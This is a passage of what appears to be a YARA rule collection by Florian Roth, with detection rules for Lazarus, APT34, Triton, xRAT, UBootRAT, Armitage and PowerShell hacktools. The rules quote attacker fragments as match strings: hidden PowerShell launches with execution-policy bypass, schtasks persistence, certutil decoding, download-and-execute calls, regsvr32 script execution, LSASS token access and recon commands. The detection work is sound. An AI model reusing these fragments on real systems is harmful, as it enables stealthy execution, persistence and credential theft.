= \"[?] Thread belongs to: \" ascii\n      $ = \"[?] Operating system core count: \" ascii\n      $ = \"[>] Calling Advapi32::LookupPrivilegeValue --> SeDebugPrivilege\" fullword ascii\n      $ = \"Calling Advapi32::OpenProcessToken --> LSASS\" ascii\n      $ = \"[!] Mmm, something went wrong! GetLastError returned:\" ascii\n      $ = \"if (($FileBytes[0..1] | % {[Char]$_}) -join '' -cne 'MZ')\" fullword ascii\n   condition: \n      filesize < 100KB and 1 of them\n}","date":"2017-12-27 16:49:11","description":"Detects strings from scripts in the PowerShell-Suite repo","minimum_yara":"1.7","name":"PowerShell_Suite_Hacktools_Gen_Strings_RID3648","reference":"https://github.com/FuzzySecurity/PowerShell-Suite","required_modules":[],"rule_hash":"c054953c2a313abed276db2f60c305a6","score":75,"tags":["GEN","DEMO","T1064","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule PowerShell_Suite_Eidolon_RID30A8 : DEMO FILE SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects PowerShell Suite Eidolon script - file Start-Eidolon.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/FuzzySecurity/PowerShell-Suite\"\n      date = \"2017-12-27 12:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"[+] Eidolon entry point:\" ascii\n      $ = \"C:\\\\PS> Start-Eidolon -Target C:\\\\Some\\\\File.Path -Mimikatz -Verbose\" fullword ascii\n      $ = \"[Int16]$PEArch = '0x{0}' -f ((($PayloadBytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 13000KB and 1 of them\n}","date":"2017-12-27 12:49:11","description":"Detects PowerShell Suite Eidolon script - file Start-Eidolon.ps1","minimum_yara":"1.7","name":"PowerShell_Suite_Eidolon_RID30A8","reference":"https://github.com/FuzzySecurity/PowerShell-Suite","required_modules":[],"rule_hash":"a930332d686ee27e385a839cb0d23c26","score":75,"tags":["DEMO","T1064","SCRIPT","FILE","T1086"]},{"author":"Florian Roth","content":"rule HiddenCobra_BANKSHOT_Gen_RID2F76 : DEMO EXE FILE GEN MAL NK {\n   meta:\n      description = \"Detects Hidden Cobra BANKSHOT trojan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity\"\n      date = \"2017-12-26 11:58:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Win32)\" fullword wide\n      $s2 = \"rHTTP/1.1 200 Connection established\" fullword wide\n      $s3 = \"Proxy-Connection: keep-alive\" fullword wide\n      $s4 = \"\\\\msncf.dat\" fullword wide\n      $s5 = \"msvcru32.bat\" fullword ascii\n      $s6 = \"reg delete \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" /v \\\"%s\\\" /f\" fullword ascii\n      $s7 = \"MXINFO.DLL\" fullword ascii\n      $s8 = \"usrvc32.bat\" fullword ascii\n      $s9 = \"ping -n 1 127.0.0.1\" fullword ascii\n      $s10 = \"%sd.e%sc \\\"%s > %s 2>&1\\\"\" ascii fullword\n      $s11 = \"DWS*.tmp\" ascii fullword\n      $s12 = \"CS*.tmp\" fullword wide\n      $s13 = \"WM*.tmp\" fullword wide\n      $x1 = \"CgpaipIddwspwe32Hnaehsdi\" fullword ascii\n      $x2 = \"RpiPmtiCdopIsgpao\" fullword ascii\n      $x3 = \"RpiLtnodlhOtgpcidgyA\" fullword ascii\n      $x4 = \"LatiQdgHtnrwpDbupci\" fullword ascii\n      $x5 = \"vchost.exe\" fullword ascii\n      $x6 = \"\\\\system32\\\\msncf.dat\" fullword ascii\n      $x7 = \"GprthipgHpgktcpCigwSanowpgA\" fullword ascii\n      $a1 = \"live.dropbox.com\" fullword ascii\n      $a2 = \"tatadocomo.yahoo.com\" fullword ascii\n      $a3 = \"widgets.twimg.com\" fullword ascii\n      $a4 = \"history.paypal.com\" fullword ascii\n      $a5 = \"www.bitcoin.org\" fullword ascii\n      $a6 = \"web.whatsapp.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) or 2 of ( $s* ) or 4 of ( $a* ) )\n}","date":"2017-12-26 11:58:11","description":"Detects Hidden Cobra BANKSHOT trojan","minimum_yara":"1.7","name":"HiddenCobra_BANKSHOT_Gen_RID2F76","reference":"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity","required_modules":[],"rule_hash":"c805c0b9735b2e541e02273a9b4bde2e","score":75,"tags":["NK","MAL","DEMO","FILE","GEN","EXE"]},{"author":"Florian Roth","content":"rule Armitage_msfconsole_RID2ED3 : DEMO FILE HKTL {\n   meta:\n      description = \"Detects Armitage component\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-12-24 11:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\umeterpreter\\\\u >\" fullword ascii\n      $s3 = \"^meterpreter >\" fullword ascii\n      $s11 = \"\\\\umsf\\\\u>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6d5e and filesize < 1KB and ( 8 of them ) ) or ( all of them )\n}","date":"2017-12-24 11:31:01","description":"Detects Armitage component","minimum_yara":"1.7","name":"Armitage_msfconsole_RID2ED3","reference":"Internal Research","required_modules":[],"rule_hash":"70c4348204b5d70da56e3005fb97a85d","score":75,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Armitage_OSX_RID2B94 : DEMO HKTL MACOS {\n   meta:\n      description = \"Detects Armitage component\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-12-24 09:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, MACOS\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"resources/covertvpn-injector.exe\" fullword ascii\n      $s10 = \"resources/browserpivot.x64.dll\" fullword ascii\n      $s17 = \"resources/msfrpcd_new.bat\" fullword ascii\n   condition: \n      filesize < 6000KB and 1 of them\n}","date":"2017-12-24 09:12:31","description":"Detects Armitage component","minimum_yara":"1.7","name":"Armitage_OSX_RID2B94","reference":"Internal Research","required_modules":[],"rule_hash":"d179b9817be60dfa8d671b125ce552f8","score":75,"tags":["DEMO","MACOS","HKTL"]},{"author":"Florian Roth","content":"rule Armitage_MeterpreterSession_Strings_RID3556 : DEMO HKTL {\n   meta:\n      description = \"Detects Armitage component\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-12-24 16:08:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"session.meterpreter_read\" fullword ascii\n      $s2 = \"sniffer_dump\" fullword ascii\n      $s3 = \"keyscan_dump\" fullword ascii\n      $s4 = \"mimikatz_command\" fullword ascii\n      $s5 = \"MeterpreterSession.java\" fullword ascii\n   condition: \n      filesize < 30KB and 1 of them\n}","date":"2017-12-24 16:08:51","description":"Detects Armitage component","minimum_yara":"1.7","name":"Armitage_MeterpreterSession_Strings_RID3556","reference":"Internal Research","required_modules":[],"rule_hash":"30ddf234bd6521e9641f3164ae0e3a57","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule Lazarus_Dec_17_4_RID2CB8 : APT DEMO NK {\n   meta:\n      description = \"Detects Lazarus malware from incident in Dec 2017ithumb.js\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/8U6fY2\"\n      date = \"2017-12-20 10:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"var _0xf5ed=[\\\"\\\\x57\\\\x53\\\\x63\\\\x72\\\\x69\\\\x70\\\\x74\\\\x2E\\\\x53\\\\x68\\\\x65\\\\x6C\\\\x6C\\\",\" ascii\n   condition: \n      filesize < 9KB and 1 of them\n}","date":"2017-12-20 10:01:11","description":"Detects Lazarus malware from incident in Dec 2017ithumb.js","minimum_yara":"1.7","name":"Lazarus_Dec_17_4_RID2CB8","reference":"https://goo.gl/8U6fY2","required_modules":[],"rule_hash":"7b9f0eddc2f513deeef53671876616f9","score":75,"tags":["APT","DEMO","NK"]},{"author":"Florian Roth","content":"rule Lazarus_Dec_17_1_RID2CB5 : APT DEMO FILE NK T1223 {\n   meta:\n      description = \"Detects Lazarus malware from incident in Dec 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/8U6fY2\"\n      date = \"2017-12-20 10:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, NK, T1223\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"::DataSpace/Storage/MSCompressed/Transform/\" ascii\n      $s2 = \"HHA Version 4.\" ascii\n      $s3 = { 74 45 58 74 53 6F 66 74 77 61 72 65 00 41 64 6F\n              62 65 20 49 6D 61 67 65 52 65 61 64 79 71 } \n      $s4 = \"bUEeYE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5449 and filesize < 4000KB and all of them\n}","date":"2017-12-20 10:00:41","description":"Detects Lazarus malware from incident in Dec 2017","minimum_yara":"1.7","name":"Lazarus_Dec_17_1_RID2CB5","reference":"https://goo.gl/8U6fY2","required_modules":[],"rule_hash":"88b9ff00d315152b02486a1cc2bf6cbb","score":75,"tags":["APT","DEMO","NK","FILE","T1223"]},{"author":"Florian Roth","content":"rule Lazarus_Dec_17_2_RID2CB6 : APT DEMO EXE FILE NK {\n   meta:\n      description = \"Detects Lazarus malware from incident in Dec 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/8U6fY2\"\n      date = \"2017-12-20 10:00:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SkypeSetup.exe\" fullword wide\n      $s2 = \"%s\\\\SkypeSetup.exe\" fullword ascii\n      $s3 = \"Skype Technologies S.A.\" fullword wide\n      $a1 = \"Microsoft Code Signing PCA\" ascii wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and ( all of ( $s* ) and not $a1 )\n}","date":"2017-12-20 10:00:51","description":"Detects Lazarus malware from incident in Dec 2017","minimum_yara":"1.7","name":"Lazarus_Dec_17_2_RID2CB6","reference":"https://goo.gl/8U6fY2","required_modules":[],"rule_hash":"565f5b81028a9aafd2cba6ae1131289b","score":75,"tags":["APT","DEMO","EXE","FILE","NK"]},{"author":"Florian Roth","content":"rule Lazarus_Dec_17_5_RID2CB9 : APT DEMO NK T1033 T1053 {\n   meta:\n      description = \"Detects Lazarus malware from incident in Dec 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/8U6fY2\"\n      date = \"2017-12-20 10:01:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, NK, T1033, T1053\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList\" fullword ascii\n      $x2 = \"$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;\" fullword ascii\n      $x3 = \"[String]$PS_PATH = \\\"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\Documents\\\\\\\\ProxyAutoUpdate.ps1\\\";\" fullword ascii\n      $x4 = \"$cmdSchedule = 'schtasks /create /tn \\\"ProxyServerUpdater\\\"\" ascii\n      $x5 = \"/tr \\\"powershell.exe -ep bypass -windowstyle hidden -file \" ascii\n      $x6 = \"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\Documents\\\\\\\\tmp' + -join \" ascii\n      $x7 = \"$cmdResult = cmd.exe /c $cmdInst | Out-String;\" fullword ascii\n      $x8 = \"whoami /groups | findstr /c:\\\"S-1-5-32-544\\\"\" fullword ascii\n   condition: \n      filesize < 500KB and 1 of them\n}","date":"2017-12-20 10:01:21","description":"Detects Lazarus malware from incident in Dec 2017","minimum_yara":"1.7","name":"Lazarus_Dec_17_5_RID2CB9","reference":"https://goo.gl/8U6fY2","required_modules":[],"rule_hash":"313deaf84e4012c6d9aef4cfcc783830","score":75,"tags":["APT","DEMO","T1033","T1053","NK"]},{"author":"Florian Roth","content":"rule Invoke_PSImage_RID2C62 : DEMO SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects a command to execute PowerShell from String\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/peewpw/Invoke-PSImage\"\n      date = \"2017-12-16 09:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"IEX([System.Text.Encoding]::ASCII.GetString(\" ascii wide\n      $ = \"System.Drawing.Bitmap((a Net.WebClient).OpenRead(\" ascii wide\n      $ = { 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52\n            00 00 04 E4 00 00 03 A0 08 06 00 00 00 9D AF A9\n            E8 00 00 00 09 70 48 59 73 00 00 19 D6 00 00 19\n            D6 01 18 D1 CA ED 00 00 00 07 74 49 4D 45 07 E1\n            0C 0F 13 1E 36 89 C4 28 BF 00 00 00 07 74 45 58\n            74 41 75 74 68 6F 72 00 A9 AE CC 48 00 00 00 0C\n            74 45 58 74 44 65 73 63 72 69 70 74 69 6F 6E 00\n            13 09 21 23 00 00 00 0A 74 45 58 74 43 6F 70 79\n            72 69 67 68 74 00 AC 0F CC 3A 00 00 00 0E 74 45\n            58 74 43 72 65 61 74 69 6F 6E 20 74 69 6D 65 00\n            35 F7 0F } \n   condition: \n      filesize < 3000KB and 1 of them\n}","date":"2017-12-16 09:46:51","description":"Detects a command to execute PowerShell from String","minimum_yara":"1.7","name":"Invoke_PSImage_RID2C62","reference":"https://github.com/peewpw/Invoke-PSImage","required_modules":[],"rule_hash":"fa87ad2742d0232286d64da0b74c8371","score":75,"tags":["DEMO","T1064","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule Suspicious_AutoIt_by_Microsoft_RID334C : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a AutoIt script with Microsoft identification\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - VT\"\n      date = \"2017-12-14 14:41:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Microsoft Corporation. All rights reserved\" fullword wide\n      $s2 = \"AutoIt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2017-12-14 14:41:51","description":"Detects a AutoIt script with Microsoft identification","minimum_yara":"1.7","name":"Suspicious_AutoIt_by_Microsoft_RID334C","reference":"Internal Research - VT","required_modules":[],"rule_hash":"b1ab19499a3bc25877a2c0033f156769","score":60,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Triton_trilog_RID2C81 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Triton APT malware - file trilog.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/vtQoCQ\"\n      date = \"2017-12-14 09:52:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"inject.bin\" ascii\n      $s2 = \"PYTHON27.DLL\" fullword ascii\n      $s3 = \"payload\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}","date":"2017-12-14 09:52:01","description":"Detects Triton APT malware - file trilog.exe","minimum_yara":"1.7","name":"Triton_trilog_RID2C81","reference":"https://goo.gl/vtQoCQ","required_modules":[],"rule_hash":"60051ea34a065dbc2e1e80f00baff4dd","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule ZXshell_20171211_chrsben_RID2F0D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ZxShell variant surfaced in Dec 17\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/snc85M\"\n      date = \"2017-12-11 11:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ncProxyXll\" fullword ascii\n      $s1 = \"Uniscribe.dll\" fullword ascii\n      $s2 = \"GetModuleFileNameDll\" fullword ascii\n      $s4 = \"$Hangzhou Shunwang Technology Co.,Ltd0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == \"de481441d675e9aca4f20bd8e16a5faa\" or pe.exports ( \"PerfectWorld\" ) or pe.exports ( \"ncProxyXll\" ) or 1 of ( $x* ) or 2 of them )\n}","date":"2017-12-11 11:40:41","description":"Detects ZxShell variant surfaced in Dec 17","minimum_yara":"1.7","name":"ZXshell_20171211_chrsben_RID2F0D","reference":"https://goo.gl/snc85M","required_modules":["pe"],"rule_hash":"eed3c0ffa0ec4c09d70013689a2920f9","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ReconCommands_in_File_RID2F4F : DEMO SUSP T1007 T1033 T1057 T1082 {\n   meta:\n      description = \"Detects various recon commands in a single file\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/haroonmeer/status/939099379834658817\"\n      date = \"2017-12-11 11:51:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1007, T1033, T1057, T1082\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"tasklist\" \n      $ = \"net time\" \n      $ = \"systeminfo\" \n      $ = \"whoami\" \n      $ = \"nbtstat\" \n      $ = \"net start\" \n      $ = \"qprocess\" \n      $ = \"nslookup\" \n   condition: \n      filesize < 5KB and 4 of them\n}","date":"2017-12-11 11:51:41","description":"Detects various recon commands in a single file","minimum_yara":"1.7","name":"ReconCommands_in_File_RID2F4F","reference":"https://twitter.com/haroonmeer/status/939099379834658817","required_modules":[],"rule_hash":"8e3f594f562cdc4b6f167ee60bf0fc43","score":40,"tags":["SUSP","T1057","T1033","T1007","DEMO","T1082"]},{"author":"Florian Roth","content":"rule xRAT_1_RID2900 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Patchwork malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Pg3P4W\"\n      date = \"2017-12-11 19:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\" -CHECK & PING -n 2 127.0.0.1 & EXIT\" fullword wide\n      $x2 = \"xClient.Core.Elevation\" fullword ascii\n      $x3 = \">> Welcome to MAX-Shell :Session created\" fullword wide\n      $x4 = \"xClient.Properties.Resources.resources\" fullword ascii\n      $x5 = \"<description>My UAC Compatible application</description>\" fullword ascii\n      $s1 = \"ping -n 20 localhost > nul\" fullword wide\n      $s2 = \"DownloadAndExecute\" fullword ascii\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36\" fullword wide\n      $s4 = \"Client.exe\" fullword ascii\n      $s5 = \"Microsoft -Defender\" fullword wide\n      $s6 = \"Microsoft- Defender\" fullword wide\n      $s7 = \"set_RunHidden\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2017-12-11 19:45:01","description":"Detects Patchwork malware","minimum_yara":"1.7","name":"xRAT_1_RID2900","reference":"https://goo.gl/Pg3P4W","required_modules":[],"rule_hash":"a8c2b4c4f8ba13dd3d2c6b1af60b50e6","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT34_Malware_HTA_RID2CC1 : APT DEMO MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects APT 34 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html\"\n      date = \"2017-12-07 10:02:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"WshShell.run \\\"cmd.exe /C C:\\\\ProgramData\\\\\" ascii\n      $x2 = \".bat&ping 127.0.0.1 -n 6 > nul&wscript  /b\" ascii\n      $x3 = \"cmd.exe /C certutil -f  -decode C:\\\\ProgramData\\\\\" ascii\n      $x4 = \"a.WriteLine(\\\"set Shell0 = CreateObject(\" ascii\n      $x5 = \"& vbCrLf & \\\"Shell0.run\" ascii\n      $s1 = \"<title>Blog.tkacprow.pl: HTA Hello World!</title>\" fullword ascii\n      $s2 = \"<body onload=\\\"test()\\\">\" fullword ascii\n   condition: \n      filesize < 60KB and ( 1 of ( $x* ) or all of ( $s* ) )\n}","date":"2017-12-07 10:02:41","description":"Detects APT 34 malware","minimum_yara":"1.7","name":"APT34_Malware_HTA_RID2CC1","reference":"https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html","required_modules":[],"rule_hash":"819d957427d626ea2ec2851b1c5fe99c","score":75,"tags":["APT","DEMO","MIDDLE_EAST","MAL"]},{"author":"Florian Roth","content":"rule APT34_Malware_Exeruner_RID2F32 : APT DEMO EXE FILE MAL MIDDLE_EAST T1053 {\n   meta:\n      description = \"Detects APT 34 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html\"\n      date = \"2017-12-07 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1053\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Debug\\\\exeruner.pdb\" ascii\n      $x2 = \"\\\"wscript.shell`\\\")`nShell0.run\" wide\n      $x3 = \"powershell.exe -exec bypass -enc \\\" + ${global:$http_ag} +\" wide\n      $x4 = \"/c powershell -exec bypass -window hidden -nologo -command \" fullword wide\n      $x5 = \"\\\\UpdateTasks\\\\JavaUpdatesTasksHosts\\\\\" wide\n      $x6 = \"schtasks /create /F /ru SYSTEM /sc minute /mo 1 /tn\" wide\n      $x7 = \"UpdateChecker.ps1 & ping 127.0.0.1\" wide\n      $s8 = \"exeruner.exe\" fullword wide\n      $s9 = \"${global:$address1} = $env:ProgramData + \\\"\\\\Windows\\\\Microsoft\\\\java\\\";\" fullword wide\n      $s10 = \"C:\\\\ProgramData\\\\Windows\\\\Microsoft\\\\java\" fullword wide\n      $s11 = \"function runByVBS\" fullword wide\n      $s12 = \"$84e31856-683b-41c0-81dd-a02d8b795026\" fullword ascii\n      $s13 = \"${global:$dns_ag} = \\\"aQBmACAAKAAoAEcAZQB0AC0AVwBtAGk\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}","date":"2017-12-07 11:46:51","description":"Detects APT 34 malware","minimum_yara":"1.7","name":"APT34_Malware_Exeruner_RID2F32","reference":"https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html","required_modules":[],"rule_hash":"69ada7dd7d1f48ce90aa156b84dd752b","score":75,"tags":["MAL","DEMO","T1053","FILE","MIDDLE_EAST","APT","EXE"]},{"author":"Florian Roth","content":"rule Universal_Exploit_Strings_RID3157 : DEMO SUSP {\n   meta:\n      description = \"Detects a group of strings often used in exploit codes\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2017-12-02 13:18:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Exploit\" fullword ascii\n      $s2 = \"Payload\" fullword ascii\n      $s3 = \"CVE-201\" ascii\n      $s4 = \"bindshell\" \n   condition: \n      ( filesize < 2KB and 3 of them )\n}","date":"2017-12-02 13:18:21","description":"Detects a group of strings often used in exploit codes","minimum_yara":"1.7","name":"Universal_Exploit_Strings_RID3157","reference":"not set","required_modules":[],"rule_hash":"30d5be6afd352ecd58a10c4d232a55ce","score":50,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Suspicious_JS_script_content_RID3292 : DEMO SCRIPT T1064 T1117 {\n   meta:\n      description = \"Detects suspicious statements in JavaScript files\"\n      author = \"Florian Roth\"\n      reference = \"Research on Leviathan https://goo.gl/MZ7dRg\"\n      date = \"2017-12-02 14:10:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064, T1117\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"new ActiveXObject('WScript.Shell')).Run('cmd /c \" ascii\n      $x2 = \".Run('regsvr32 /s /u /i:\" ascii\n      $x3 = \"new ActiveXObject('WScript.Shell')).Run('regsvr32 /s\" fullword ascii\n      $x4 = \"args='/s /u /i:\" ascii\n   condition: \n      ( filesize < 10KB and 1 of them )\n}","date":"2017-12-02 14:10:51","description":"Detects suspicious statements in JavaScript files","minimum_yara":"1.7","name":"Suspicious_JS_script_content_RID3292","reference":"Research on Leviathan https://goo.gl/MZ7dRg","required_modules":[],"rule_hash":"c4ff8b7f0a9876c0151b731812a220cc","score":70,"tags":["DEMO","T1064","SCRIPT","T1117"]},{"author":"Florian Roth","content":"rule UBootRAT_RID29E1 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects UBoot RAT Samples\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\"\n      date = \"2017-11-29 02:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"URLDownloadToFileA\" ascii\n      $s2 = \"GetModuleFileNameW\" ascii\n      $s4 = \"WININET.dll\" ascii\n      $s5 = \"urlmon.dll\" ascii\n      $s6 = \"WTSAPI32.dll\" ascii\n      $s7 = \"IPHLPAPI.DLL\" ascii\n      $op1 = { 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68\n               69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F\n               74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20\n               6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 } \n      $vprotect = { 2E 76 6D 70 30 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and uint32 ( uint32 ( 0x3c ) ) == 0x4550 and filesize < 1400KB and filesize > 800KB and ( all of ( $s* ) and $op1 at 64 and uint16 ( uint32 ( 0x3c ) + 11 ) == 0x59 and $vprotect in ( 600 .. 700 ) )\n}","date":"2017-11-29 02:00:01","description":"Detects UBoot RAT Samples","minimum_yara":"1.7","name":"UBootRAT_RID29E1","reference":"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/","required_modules":[],"rule_hash":"a2c11337ee1733789a4f7c455a5093bf","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule UBootRAT_Dropper_RID2D1C : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects UBootRAT Dropper\"\n      author = \"Florian Roth\"\n      reference = 